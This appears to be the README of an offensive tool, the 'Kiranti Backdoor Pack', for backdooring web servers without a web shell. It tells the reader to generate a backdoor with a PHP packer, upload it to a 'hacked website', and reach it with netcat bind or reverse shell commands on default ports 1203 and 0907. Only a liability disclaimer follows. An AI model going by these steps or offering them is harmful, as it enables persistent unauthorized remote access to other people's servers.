# kirantipack

```
██╗  ██╗██╗██████╗  █████╗ ███╗   ██╗████████╗██╗
██║ ██╔╝██║██╔══██╗██╔══██╗████╗  ██║╚══██╔══╝██║
█████╔╝ ██║██████╔╝███████║██╔██╗ ██║   ██║   ██║
██╔═██╗ ██║██╔══██╗██╔══██║██║╚██╗██║   ██║   ██║
██║  ██╗██║██║  ██║██║  ██║██║ ╚████║   ██║   ██║
╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚═╝
```                            
                    Version: 1.2

Kiranti Backdoor Pack

This is a project for backdooring webserver without using web-based shell

### How To Use
* Download this project
* Generate your own backdoor with: 
```
$ php packer.php
```
* Upload to your hacked website and access
* We will use netcat for connect to our backdoor

for bind connect:
```
$ nc -v [server ip] 1203
```

for reverse connect:
```
$ nc -lvp 0907
```

PS: 1203 and 0907 is default port

### Disclaimer

I as the author assume no liability and not responsible for any misused this project

### Updates

[x] Removing option -t and Carbylamine encoded source
